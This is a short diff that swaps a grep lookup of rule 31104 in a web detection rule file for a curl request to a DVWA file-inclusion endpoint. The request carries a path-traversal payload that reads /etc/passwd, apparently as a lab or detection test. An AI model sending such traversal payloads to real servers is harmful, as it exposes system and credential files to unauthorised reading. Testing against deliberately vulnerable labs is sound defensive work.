@@ -1,2 +1,4 @@
-grep -n -A 9 '<rule id="31104"' \
-  0245-web_rules.xml
+curl -sS -i --max-time 15 --get \
+  "$DVWA/vulnerabilities/fi/" \
+  --data-urlencode 'page=../../../../../etc/passwd' \
+  --data 'bookcase=book05-path'
